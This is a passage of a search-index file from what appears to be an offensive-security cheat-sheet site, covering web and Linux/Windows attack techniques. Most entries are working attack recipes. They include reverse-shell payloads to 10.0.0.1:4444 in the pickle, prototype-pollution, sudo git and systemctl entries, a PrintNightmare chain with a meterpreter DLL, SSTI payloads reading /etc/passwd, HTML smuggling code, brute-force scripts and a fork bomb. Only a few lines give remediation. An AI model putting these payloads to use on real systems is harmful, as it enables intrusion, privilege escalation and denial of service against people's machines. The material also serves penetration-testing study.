                content: "Find Vulnerabilities from HTML Source Code linkFirst check values of attributes on input elements.\nThen try what will happen when you change the Cookie value in a HTTP header.\nCookie: user_id=12 Change GET Parameters linkManual link /user?id=1 /user?id=2 /user?id=-1 /user?id=00 /admin/posts/1 /admin/posts/-1 /admin/posts/00 /static/1.txt /static/2.txt /static/-1.txt /static/00.txt Automation link seq 0 100 | ffuf -u https://example.com/user?id=FUZZ -w - wfuzz -z file,./numbers.txt https://example.com/user?id=FUZZ Change POST Parameters link address=1\u0026user_id=1 address=1\u0026user_id=2 # URL Encode '\u0026' address=1%26user_id=2 "
            }
        );
    index.add(
            {
                id:  125 ,
                href: "\/docs\/hdks\/web\/security-risk\/client-side-javascript-validation-bypass\/",
                title: "Client-Side JavaScript Validation Bypass",
                description: "If the website checks the user input and validates them using JavaScript, we may be able to bypass this validation by adding breakpoint and modify some variable with developer tools in web browser.",
                content: "Investigation linkFor example, assume that website modifies user input then validation check when logged in as the following JavaScript (e.g. validation.js).\n// validation.js function validate() { let username = document.getElementById(\"username\").value; let password = document.getElementById(\"password\").value; // Change the username input if it contains \"admin\" to confuse attackers. username = username.replace(/admin/g, \"noob\"); // If the input value of the username/password are both \"admin\", we can bypass this validation. if (username === \"admin\" \u0026\u0026 password === \"admin\") { return true; } return false; } By the way, this example may not exist in real world because its too simple.\nExploitation link In web browser, open Developer tools. Go to Sources tab and select target JavaScript file which checks user input. Add a breakpoint at the line where the validation is executed e.g. at the line if (username === \"admin\"... in the above validation.js example. Back to the web login page, and input username/password in login form. Then submit. Browser stops at the breakpoint weve added. Go to Console tab in developer tool. Assign the desired value to the target variable e.g. username = \"admin\"(reassign admin to undo what was modified by JavaScript). "
            }
        );
    index.add(
            {
                id:  126 ,
                href: "\/docs\/hdks\/windows\/forensics\/reading-onedrive-logs\/",
                title: "Reading OneDrive Logs",
                description: "OneDrive log files can be read by deobfuscating.",
                content: "Deobfuscating Log Files linkTo read OneDrive logs, we need to deobfuscate log files (.odl, .odlsent, .odlgz).\nThese logs are located in the following on Windows:\nC:\\Users\\\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\ C:\\Users\\\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Business1\\ This repository is useful to deobfuscate OneDrive logs.\npython -m venv venv # on Windows .\\venv\\Scripts\\activate pip install construct pycryptodome python odl.py -o .\\output.csv c:\\Users\\\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Personal\\ After that, we can read the output file (output.csv) with tools such as VS Code and Excel.\nThis file contains sensitive information such as OneDrive account email, access token, etc.\n"
            }
        );
    index.add(
            {
                id:  127 ,
                href: "\/docs\/hdks\/web\/tool\/add-custom-http-headers-in-burp-suite\/",
                title: "Add Custom HTTP Headers in Burp Suite",
                description: "In Burp Suite, we can add custom header by setting up options.",
                content: "Add Custom HTTP Headers linkIn some cases such as bug bounty programs, it may be convenient to set custom HTTP headers in advance.\nGo to Proxy -\u003e Options tab.\nScroll down to Match and Replace.\nClick on Add.\nSet rule:\nUser Agent\nType: Request header Match: ^User-Agent.*$ Replace: User-Agent: HackerOne-username Comment: New Original Header\nType: Request header Match: (empty) Replace: X-Bug-Bounty: HackerOne-username Comment: Check the box of Regex match.\nClick on OK.\nSearch for the rule in the list and click on Enabled.\n"
            }
        );
    index.add(
            {
                id:  128 ,
                href: "\/docs\/hdks\/web\/tool\/automate-sequence-requests-with-burp-intruder\/",
                title: "Automate Sequence Requests with Burp Intruder",
                description: "By using Intruder in Burp Suite, we can send sequence requests to websites.",
                content: "Automation link Project options -\u003e Sessions -\u003e Session handling rules panel -\u003e Click Add. The Session handling rules editor opens. Scope tab -\u003e Select Include all URLs. Details tab -\u003e Under Rule actions -\u003e Click Add -\u003e Run a macro -\u003e Under Select macro -\u003e Click Add. The Macro Recorder opens. Select the sequence of requests as follows: POST /message/submit GET /message POST /account Click OK. Manage Parameters link In the list of requests, select the requests in which specific value used POST parameter changes. Click Configure item -\u003e Dialog opens -\u003e Click Add -\u003e Enter the name of the parameter. Highlight the value in the response code. Click OK twice to go back to the Macro editor. Select the POST request in which using the above value for parameter. Click Configure item -\u003e In the Parameter handling section -\u003e drop-down to menus to specify the parameter name to be derived from the prior response (response 4) -\u003e Click OK. In the Macro editor -\u003e Click Test macro to check if the sequence does correctly. Send the arbitrary request to the Burp Intruder. Select Sniper attack type. On the Payloads tab -\u003e select the payload type Null payloads -\u003e Under Payload options -\u003e enter the arbitrary number of payloads. Start the attack. "
            }
        );
    index.add(
            {
                id:  129 ,
                href: "\/docs\/hdks\/web\/tool\/integrate-burp-request-and-sqlmap\/",
                title: "Integrate Burp Request and SQLmap",
                description: "We can use the Burp Suite request state for SQLmap by downloading item.",
                content: "Download Request File in Burp Suite link Right click on the request field in Burp Suite. Click Save item or Copy to file to download the request state. Save as request.txt (this is arbitrary name). Using Request File in SQLmap linkAfter downloading the request file in Burp Suite as the previous section, we can use when running SQLmap.\nsqlmap -r request.txt By the way, we can see what SQLmap send payloads to websites by adding the --proxy flag.\n# 8080 is the default port of Burp Suite sqlmap -r request.txt --proxy http://127.0.0.1:8080 "
            }
        );
    index.add(
            {
                id:  130 ,
                href: "\/docs\/hdks\/web\/tool\/socks-proxy-in-burp-suite\/",
                title: "SOCKS Proxy in Burp Suite",
                description: "If we want to use SOCKS proxy in Burp Suite, we can add it in the proxy setting.",
                content: "Setup SOCKS Proxy link In Burp Suite, go to Proxy  Proxy settings.\nIn the settings window, select User tab and go to Netwotk  Connections in left pane.\nIn the SOCKS proxy section, enable Override options for this project only.\nFill proxy host and port as follow:\nSOCKS proxy host: 127.0.0.1 SOCKS proxy port: 9251 Check Use SOCKS proxy and close the window.\n"
            }
        );
    index.add(
            {
                id:  131 ,
                href: "\/docs\/hdks\/web\/tool\/turbo-intruder-in-burp-suite\/",
                title: "Turbo Intruder in Burp Suite",
                description: "Turbo Intruder is the Burp Suite extension for brute forcing or fuzzing to websites.",
                content: "Using Single Parameter linkSet %s to the parameter for brute force.\nFor example, set %s as the value of password then we can brute force to password.\nPOST /login HTTP/1.1 ... username=admin\u0026password=%s Here is the Python cheat sheet. We can use either code depending on the situation.\ndef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=5, pipeline=False ) # Brute force (wordlist) for word in open('/usr/share/wordlists/rockyou.txt'): engine.queue(target.req, word.rstrip()) # Brute force (0 - 255) for i in range(0, 255): engine.queue(target.req, str(i)) # Brute force (0000 - 9999) for word in open('/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt'): engine.queue(target.req, word.rstrip()) # Brute Force (alphabet) for word in open('/usr/share/seclists/Fuzzing/char.txt'): engine.queue(target.req, word.rstrip()) # Brute Force (alphanum upper-lower) for word in open('/usr/share/seclists/Fuzzing/alphanum-case.txt'): engine.queue(target.req, word.rstrip()) # Null payloads (infinite loop) i = 0 while i \u003c 1: engine.queue(target.req, None) # Null payloads (100 loops) i = 0 while i \u003c 100: engine.queue(target.req, None) i += 1 def handleResponse(req, interesting): if interesting: table.add(req) Using Multiple Parameters linkIn addition to simple parameter, we can apply multiple parameters e.g. username and password.\nPOST /login HTTP/1.1 ... username=%s\u0026password=%s Here is the Python script. We need to apply multiple words for each parameter as below.\ndef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=100, pipeline=False) # Set multiple words for parameters. for word1 in open('/path/to/usernames'): for word2 in open('/path/to/passwords'): engine.queue(target.req, [word1.rstrip(), word2.rstrip()]) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status != 404: table.add(req) "
            }
        );
    index.add(
            {
                id:  132 ,
                href: "\/docs\/hdks\/web\/security-risk\/web-race-condition-attack\/",
                title: "Web Race Condition Attack",
                description: "Race condition is a vulnerability of web applications by concurrent requests to circumvent limiting the state.",
                content: "Investigation linkIf target website has the functionality that logged-in user can apply the 10% off code for buying products, the code must be applied only one time most of the time. However, this rule might be bypassed by exploiting race condition vulnerability with concurrent requests.\nRace Condition Attack using Turbo Intruder in Burp Suite linkWe can easily achieve race condition attack by using Turbo Intruder.\nIn Burp Suite, right-click on specific request.\nSelect Extensions  Turbo Intruder. If it does not exist, you need to install it in the BApp Store of Burp Suite.\nIn Turbo Intruder window, set specific value to the concurrentConnection param of the RequestEngine method. This value is up to target website logic. For example, if we need to apply coupon code 20 times in EC site, set 20.\ndef queueRequests(target, wordlists): engine = RequestEngine( endpoint=target.endpoint, concurrentConnections=20, # change this value for race condition. requestsPerConnection=1, pipeline=False) # For loop requests i = 0 while i \u003c 100: # this value is arbitrary but not very important for this situation. engine.queue(target.req, None) i += 1 def handleResponse(req, interesting): if interesting: table.add(req) Now click Attack button. Since the request N times at the same time, we may be able to bypass the limit to be applied some code e.g. coupon, invite code, etc.\n"
            }
        );
    index.add(
            {
                id:  133 ,
                href: "\/docs\/hdks\/web\/security-risk\/prototype-pollution-in-server-side\/",
                title: "Prototype Pollution in Server-Side",
                description: "Prototype Pollution is a JavaScript vulnerability that allows attackers to add arbitrary properties to global object prototypes. The vulnerability may exist in Node.js applications.",
                content: "Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.\nPOST /user/update HTTP/1.1 Host: example.com ... { \"name\": \"john\", \"email\": \"john@example.com\", \"__proto__\": { \"foo\": \"bar\" } } // Other option { \"name\": \"john\", \"email\": \"john@example.com\", \"constructor\": { \"prototype\": { \"foo\": \"bar\" } } } // Bypass sanitization 1 { \"name\": \"john\", \"email\": \"john@example.com\", \"__pro__proto__to__\": { \"foo\": \"bar\" } } // Bypass sanitization 2 { \"name\": \"john\", \"email\": \"john@example.com\", \"constconstructorructor\": { \"prototype\": { \"foo\": \"bar\" } } } If our property is added into the target object as below, we can inject malicious property which leads to privilege escalation, reverse shell, so on.\n{ \"name\": \"john\", \"email\": \"john@example.com\", \"isAdmin\": false, \"foo\": \"bar\" } Privilege Escalation link { \"name\": \"john\", \"email\": \"john@example.com\", \"__proto__\": { \"isAdmin\": true } } JSON Spaces Overriding linkInject the additional property whose key contains spaces, and send request.\nPOST /user/update HTTP/1.1 { \"name\": \"john\", \"email\": \"john@example.com\", \"__proto__\": { \"json spaces\": 10 } } In response, if indents is added at the json body as below, the polluted property affects the server.\nTo check that in Burp Suite, click Raw tab in HTTP response window.\n{ \"name\": \"john\", \"email\": \"john@example.com\", \"json spaces\": 10 } Status Code Overriding linkFirst off, cause syntax error deliberately by removing comma in the json body when sending POST request.\nPOST /user/update HTTP/1.1 { \"name\": \"john\" \"email\": \"john@example.com\" } Of course we receive the error response as json object that might contain status or statusCode like below.\n{ \"error\":{ \"status\":500, \"message\":\"Json parse error\" } } Now we try to update the status code to arbitrary number (400-599) and observe if the status code will be changed.\nWe need to send correct json format at the time because we want to apply our payload.\nPOST /user/update HTTP/1.1 { \"name\": \"john\", \"email\": \"john@example.com\", \"__proto__\": { \"status\": 555 } } Finally we can check if our polluted property affects the server status by sending the incorrect json format body again.\nPOST /user/update HTTP/1.1 { \"name\": \"john\" \"email\": \"john@example.com\" } If the server responses the error contains the modified status code, the vulnerability of the prototype pollution exists in the web server.\n{ \"error\":{ \"status\":555, \"message\":\"Json parse error\" } } Remote Code Execution (RCE) linkReference: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce\nIt may often occur in the child_process module in Node.\n\"__proto__\": { \"shell\": \"node\", \"NODE_OPTIONS\": \"--inspect=evil\\\"\\\".com\" } shell: It enables us to set a specific shell such as sh, bash, in which to run commands. NODE_OPTIONS: The environment variable that defines the command-line arguments. RCE via child_process.spawn(), child_process.fork() link \"__proto__\": { \"execArgv\": [ \"--eval=require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.0.0.1 4444 \u003e/tmp/f')\" ]} Overwrite Environment Variable linkBelow also can be achieved.\n\"constructor\":{ \"prototype\":{ \"env\":{ \"xyz\":\"require('child_process').execSync('whoami').toString()\" }, \"NODE_OPTIONS\":\"--require /proc/self/environ\" } } env\nSet the value of the xyz to environment variables.\n--require /proc/self/environ\nInject environment variables from the current process as a module.\n"
            }
        );
    index.add(
            {
                id:  134 ,
                href: "\/docs\/hdks\/web\/ghostscript-pentesting\/",
                title: "GhostScript Pentesting",
                description: "GhostScriipt is an interpreter for the PostScript language and PDF files. It might be vulnerable to code execution.",
                content: "Arbitrary Command Execution (CVE-2018-16509) Before v9.24 linkReference: https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509\nIf target website uses the functionality which allows user to upload image files associated Pythons Pillow (PIL), we can execute remote command over GhostScript vulnerability (-dSAFER bypass using OutputFile).\nCreate an image file in which contents as below, then upload it. Command will be executed in the target server.\n%!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: -0 -0 100 100 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%touch /tmp/hello.txt) currentdevice putdeviceprops "
            }
        );
    index.add(
            {
                id:  135 ,
                href: "\/docs\/hdks\/web\/framework\/python\/python-pickle-rce\/",
                title: "Python Pickle RCE",
                description: "The python pickle module, that serializes and deserializes a Python object, is vulnerable to remote code execution. If the website uses this module, we may be able to execute arbitrary code.",
                content: "Exploitation linkBelow is the Python script (mypickle.py) to generate the payload to reverse shell.\nimport pickle import base64 import os class RCE: def __reduce__(self): cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u003e\u00261 | nc 10.0.0.1 4444 \u003e /tmp/f') return os.system, (cmd,) if __name__ == '__main__': pickled = pickle.dumps(RCE()) print(base64.b64encode(pickled)) # or print(base64.urlsafe_b64encode(pickled)) Now run this script to generate the Base64 payload.\npython3 mypickle.py Copy the ourput base64 string and paste it to where the payload affects in website.\nBefore reloading the web page, start a listener in local machine.\nnc -lvnp 4444 Then reload the page. We should get a shell in local terminal.\n"
            }
        );
    index.add(
            {
                id:  136 ,
                href: "\/docs\/hdks\/web\/framework\/ruby\/ruby-on-rails-pentesting\/",
                title: "Ruby on Rails Pentesting",
                description: "Ruby on Rails is a web application framework written in Ruby.",
                content: "Common Directories link /assets/application.css /config /Gemfile /Gemfile.lock /rails/info /rails/info/properties /rails/info/routes In addition, its worth to fuzz under /rails/ directory as below.\nffuf -u https://example.com/rails/FUZZ -w wordlist.txt ERB Template Injection linkIf target website uses ERB template which affects a page, we can inject malicious template.\ntext = \"\u003c%= 2*3 %\u003e\" result = ERB.new(text).result(binding) puts result # expected result: 6 Payloads linkReference: Server Side Template Injection\n\u003c%= 2*3 %\u003e \u003c%= self.methods %\u003e \u003c%= self.method(:handle_POST).parameters %\u003e \u003c%= Dir.entries('/') %\u003e \u003c%= File.open('/etc/passwd').read %\u003e \u003c%= system('cat /etc/passwd') %\u003e \u003c%= `ls -la /` %\u003e \u003c%= IO.popen('ls /').readlines() %\u003e Regex Check Bypass linkReference: https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/\nabc\\n\u003c%- 2*3 %\u003e We can also use curl command if we want to manipulate a payload which contains newline.\nBelow is an example for using the URL encoded payload \u003c%= IO.popen('ls /').readlines() %\u003e.\ncurl https://example.com/ -X POST -d 'abc %3C%25%3D%20IO%2Epopen%28%27ls%20%2F%27%29%2Ereadlines%28%29%20%25%3E' "
            }
        );
    index.add(
            {
                id:  137 ,
                href: "\/docs\/hdks\/windows\/service\/windows-print-spooler-service\/",
                title: "Windows Print Spooler Service",
                description: "A service that is running on each computer that participates in the Print Services system. It uses any port between 49152 and 65535. It may be vulnerable to the PrintNightmare (CVE-2021-1675 / CVE-2021-34527).",
                content: "Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane.\nIf you want to filter by Event ID, use Filter Current Log in the right pane.\nApplication and Services Logs/Microsoft/Windows/PrintService/Admin (Event ID: 808) Application and Services Logs/Microsoft/Windows/PrintService/Operational (Event ID: 316, 811) Application and Services Logs/Microsoft/Windows/SMBClient/Security (Event ID: 31017) Application and Services Logs/Microsoft/Windows/Sysmon/Operational (Event ID: 3, 11, 23, 26) Windows Logs/System (Event ID: 7031) Packet Analysis (Wireshark) linkOpen .pcap file with Wireshark.\nFilter packets with smb or smb2.\nPrintNightmare linkThis is security vulnerability to remote code execution in print spooler service.\nIt requires authentication (username/password).\n1. Clone the Repository link git clone https://github.com/cube0x0/CVE-2021-1675 2. Create a Malicious DLL using Msfvenom link mkdir share msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f dll -o ./share/malicious.dll 3. Start Metasploit and Reverse TCP link msfconsole msf \u003e use exploit/multi/handler msf \u003e set payload windows/x64/meterpreter/reverse_tcp msf \u003e set lhost msf \u003e set lport msf \u003e run -j # Started reverse tcp msf \u003e jobs 4. Host the Malicious DLL link impacket-smbserver share ./share/ -smb2support 5. Examine the Target Fits the Criteria to Exploit It link impacket-rpcdump @ | egrep 'MS-RPRN|MS-PAR' # Protocol: [MS-RPRN]: Print System Remote Protocol # Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 6. Run the Exploit link cd CVE-2021-1675 python3 CVE-2021-1675.py Domain.Controller.local/:@ '\\\\\\share\\malicious.dll' Now we should get a target shell in msfconsole.\n7. Interact with Target System linkEnter the target system via msfconsole.\nmsf\u003e sessions msf\u003e sessions -i meterpreter\u003e shell C:\\Windows\\system32\u003e whoami Workarounds link # Disable the Print Spooler service Stop-Service -Name Spooler -Force Set-Service -Name Spooler -StartupType Disabled "
            }
        );
    index.add(
            {
                id:  138 ,
                href: "\/docs\/hdks\/web\/html-smuggling\/",
                title: "HTML Smuggling",
                description: "Attackers hosts a malicious file and can invite victim to download it using the HTML Smuggling technique.",
                content: "Exploitation linkAttackers can use anchor tag to invite victim to download a malicious file as below. When clicking, the malicious file is downloaded as the name payment.docx.\nCliek Here Alternatively, attackers can also use JavaScript, then let browsers to download a malicious file when loading the page, or invite victim to click download button.\nvar a = document.createElement('a'); a.download = 'malicious_doc.docx' Using JavaScript Blob linkBy using blob, attackers can let victim to download a malicious file while obfuscate its content by encoding/decoding malicious code.\n// Decode Base64 encoded malicious code var malBase64 = ''; var malBinStr = window.atob(malBase64); var malLen = malBinStr.length; var malBytes = new Uint8Array(malLen); for (var i = 0; i \u003c malLen; i++) { malBytes[i] = malBin.charCodeAt(i); } // Create a blob // 'octet/stream' allows any file types. var malBlob = new Blob([malBytes.buffer], {type: 'octet/stream'}); var malUrl = window.URL.createObjectURL(malBlob); // Create a downloadable anchor (automatically download) var a = document.createElement('a'); a.style.display = 'none'; a.href = malUrl; a.download = 'mal.py'; document.body.appendChild(a); // this anchor will be clicked automatically. a.click(); document.body.removeChild(a); "
            }
        );
    index.add(
            {
                id:  139 ,
                href: "\/docs\/hdks\/linux\/attack\/fork-bomb\/",
                title: "Fork Bomb",
                description: "Fork Bomb is one of the denial-of-service attacks which lead the system to deplete the available resources by replicating a child process infinitely.",
                content: "Warning linkPlease dont execute the following programs in system that you dont want to harm.\nExploitation in C linkThis program forks child processes continuously.\n#include #include int main() { while (1) // Create a child process from the parent process. fork(); return 0; } Exploitation in Python link import os while True: os.fork() Exploitation in Bash link :(){ :|: \u0026 };: "
            }
        );
    index.add(
            {
                id:  140 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/polkit-privilege-escalation\/",
                title: "PolKit Privilege Escalation",
                description: "Polkit (PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged ones.",
                content: "CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.\n# string:tester: The new user named \"tester\". # string:\"Tester Account\": The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:\"Tester Account\" int32:1 \u0026 sleep 0.005s; kill $! Then check the new user ID (uid).\nid tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.\n3. Send a dbus message to set a new password link dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'' string:'Ask the tester' \u0026 sleep 0.005s; kill $! 4. Switch the new user link su tester Enter the password you created e.g. password123.\nNow change to root .\nsudo -s # or sudo su root CVE-2021-4034 (PwnKit) linkPwnKit is vulnerability of Polkit to local privilege escalation.\nThere are many exploits available. Below are examples:\nhttps://github.com/arthepsy/CVE-2021-4034 https://github.com/ly4k/PwnKit https://github.com/berdav/CVE-2021-4034 https://github.com/Almorabea/pkexec-exploit (this is written by Python) Remediations linkTo avoid the vulnerability, unset setuid from the pkexec executable.\nsudo chmod 0755 /usr/bin/pkexec # or sudo chmod 0755 `which pkexec` Or simply upgrade the apt packages in most of distributions which are patched for the vulnerability.\nsudo apt update \u0026\u0026 sudo apt upgrade "
            }
        );
    index.add(
            {
                id:  141 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-git-privilege-escalation\/",
                title: "Sudo Git Privilege Escalation",
                description: "Sudo git is vulnerable to privilege escalation.",
                content: "Git Add/Commit link sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m \"commit\" If we can commit the git repository as root, we may be able to escalate privileges.\nExploitation link Create a Payload echo 'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"' \u003e /tmp/revshell chmod +x /tmp/revshell Set Git Config # Go to the git repository cd /opt/example git init echo '*.php filter=indent' \u003e .git/info/attributes git config filter.indent.clean /tmp/revshell Commit the Repository Before committing, we need to start a listener in local machine.\nnc -lvnp 4444 Then commit with sudo.\nsudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m \"commit\" Now we should get a shell in local terminal.\nGit Apply link sudo /usr/bin/git apply * If we can apply the patch for the git repository, we can update the content of arbitrary file.\nExploitation with SSH Keys linkAssume we are currently user1 user then we want to escalate to be user2.\nFirst we create a new SSH key.\ncd /home/user1 ssh-keygen -t rsa Enter file in which to save the key (/home/user1/.ssh/id_rsa): id_rsa New SSH keys (private/public) are generated under /home/user1.\nNext, add the content of id_rsa.pub into authorized_keys..\ncat /home/user1/id_rsa.pub \u003e /home/user1/.ssh/authorized_keys Then create a patch.\ncd /home git diff user1/.bash_history user1/.ssh/authorized_keys \u003e /tmp/patch After that, replace the name user1 with user2 in the patch file.\nsed -i 's/user1/user2/g' /tmp/patch Now we can apply the patch as root. This command update the target users (user2) authorization_keys to allow us to login with SSH key as user2.\nsudo /usr/bin/git apply /tmp/patch ssh -i /home/user1/.ssh/id_rsa user2@example.com "
            }
        );
    index.add(
            {
                id:  142 ,
                href: "\/docs\/hdks\/web\/teamcity-pentesting\/",
                title: "TeamCity Pentesting",
                description: "TeamCity is a build management and continuous integration server from JetBrains.",
                content: "Common Directories link /admin /admin/admin.html Interesting Files in Systems link TeamCity/conf/teamcity-startup.propertie .BuildServer/system Find Super User Authentication Tokens linkIf we find a super user authentication token, we can login as super user using the token.\ngrep -rni 'authentication token' TeamCity/logs grep -rni 'Super user authentication token' TeamCity/logs grep -rni 'token' TeamCity/logs After retrieving, we can login as administrator by entering the token in the password field and empty the username.\nArbitrary Command Execution by Custom Script link Login as admin user.\nCreate a new project in admin dashboard.\nClick Manual tab and fill required fields.\nA new project is created.\nIn the project home, create a Build Configurations.\nIn the build configuration page, click Build Steps on the left menus.\nAdd build step.\nSelect Command Line in Runner type.\nPut a Python reverse shell script in the Custom script.\nexport RHOST=\"\";export RPORT=;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' Start listener in local machine.\nnc -lvnp 4444 Click Run button in the build page.\nWe should get a shell in terminal.\nArbitrary Command Execution by Diff Build linkIf we can modify a building script, we can execute arbitrary script by uploading a git patch file.\nFirst, modify the script to our desired code.\ncd /path/to/repository vim example.ps git diff \u003e patch Then go to the build configuration page, and open the Run Custom Build at the right of the Run button.\nIn General section, check run as personal build and upload the patch file which was generated above.\nNow click Run Build. Our arbitrary code will be executed when building.\n"
            }
        );
    index.add(
            {
                id:  143 ,
                href: "\/docs\/hdks\/linux\/archive\/crack-zip-password\/",
                title: "Crack Zip Password",
                description: "When unzipping archived files, we're sometimes asked the passphrase. We may be able to crack the password with various ways.",
                content: "John The Ripper linkFormat the archived file to make the John to recognize it, then crack the hash using John.\nzip2john example.zip \u003e hash.txt john --wordlist=wordlist.txt hash.txt Fcrackzip link # -u: unzip # -D: dictionary # -p: strgin as initial password/file fcrackzip -u -D -p passwords.txt sample.zip Bkcrack linkbkcrack is useful for cracking legacy zip encryption with a known plaintext attack.\nDownload the Tool link wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz tar -xf bkcrack-1.5.0-Linux.tar.gz cd bkcrack-1.5.0-Linux.tar.gz Recover Internal Keys linkFirst we check what files in the target zip file.\n# List entries ./bkcrack -L encrypted.zip Assume the encrypted.zip contains the secret.key file and we know that it contains the secret is string.\nThen we need to create a plain file with the same string secret is.\necho -n \"secret is\" \u003e plainfile Now crack the keys using these files.\n./bkcrack -C encrypted.zip -c secret.key -p plainfile For example, we get the result 8257499e 175bb63c fcbd5ff2.\nWe can recover the password by running the following command.\n./bkcrack -C encrypted.zip -c secret.key -p plainfile -k 8257499e 175bb63c fcbd5ff2 -d result.txt After that, result.txt is generated so we can see the content of the file.\n"
            }
        );
    index.add(
            {
                id:  144 ,
                href: "\/docs\/hdks\/reconnaissance\/shodan-dorks\/",
                title: "Shodan Dorks",
                description: "Shordan is a search engine which allows us to find various types of servers by filters. This page gives ways to search specific information.",
                content: " product:elastic port:9200 country:us product:postgresql port:5432 country:jp # Search 'users' column proudct:elastic port:9200 users "
            }
        );
    index.add(
            {
                id:  145 ,
                href: "\/docs\/hdks\/web\/method\/waf-detection\/",
                title: "WAF (Web Application Firewall) Detection",
                description: "WAF (Web Application Firewall) is a specific form of application firewall that filters, monitors, and blocks HTTP traffic to and from a web service.",
                content: "Automation link nmap --script=http-waf-fingerprint example.com wafw00f https://example.com "
            }
        );
    index.add(
            {
                id:  146 ,
                href: "\/docs\/hdks\/web\/framework\/javascript\/angular-pentesting\/",
                title: "Angular Pentesting",
                description: "AngularJS is a web application framework.",
                content: "HTML Attributes linkIf a website uses AngularJS framework, the nodes have a ng-apps attribute. So you can check it in a HTML source code.\nServer-Side Template Injection (SSTI) link {{2*3}} {{$on.constructor('alert(\"test\")')()}} {{constructor.constructor('alert(\"test\")')()}} It worth testing to bypass sanitizing as below.\n# Remove one-pair braces {2*3} # Remove all braces 2*3 # Add additional braces {{{2*3}}} "
            }
        );
    index.add(
            {
                id:  147 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-systemctl-privilege-escalation\/",
                title: "Sudo Systemctl Privilege Escalation",
                description: "sudo systemctl is vulnerable to privilege escalation by modifying the configuration file.",
                content: "Modify Configurations link sudo -l (ALL) NOPASSWD: systemctl If we can run systemctl command as root, and we can edit the config file, then we might be a root user.\n1. Update the Config File linkWe need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.\n[Unit] This is an example service. [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261' [Install] WantedBy=multi-user.target Replace  with your local ip address.\n2. Start Listener in Local Machine linkThen start listener for getting a root shell.\nnc -lvnp 4444 3. Restart the Service linkReload the daemon and restart.\nsudo systemctl daemon-reload sudo systemctl restart example.service Now we should get a shell in local machine.\nSpawn Shell in the Pager link sudo -l # output (ALL) NOPASSWD: systemctl status example.service If we can execute systemctl status as root, we can spawn another shell in the pager.\nJust run the command with sudo.\nsudo systemctl status example.service Then enter the following command in the pager like less.\n!sh Spawning the shell, then we can get another user shell.\n"
            }
        );
    index.add(
            {
                id:  148 ,
                href: "\/docs\/hdks\/web\/dump-git-repository-from-website\/",
                title: "Dump Git Repository from Website",
                description: "If we can have permission to access git repositoy in target website, we can dump the git repository and investigate git logs or histories to get sensitive information.",
                content: "Dumping linkWe can simply use wget command in Linux to download the git repository.\nAfter that, we can investigate files or all histories.\n# -r: Recursive wget -r https://example.com/.git/ cd example.com git log --stat git checkout Dumping with gitdumper and extracter linkGitTools downloads Git repository of the web application.\nTo dump the repository, execute the following commands.\nwget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh chmod +x gitdumper.sh ./gitdumper.sh https://example.com/.git/ ./example We should get the git repository in local.\nThen extract the entire project by executing the following.\nwget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh chmod +x extractor.sh ./extractor.sh ./example ./new_example Now we retrieve the entire git project from website.\nIt is stored in ./new_example folder. We can investigate the repository.\nDumping with Git-Dumper linkgit-dumper is an useful Python package.\npip install git-dumper git-dumper https://example.com/.git ./dumped "
            }
        );
    index.add(
            {
                id:  149 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/buffer-overflow-privilege-escalation\/",
                title: "Buffer Overflow Privilege Escalation",
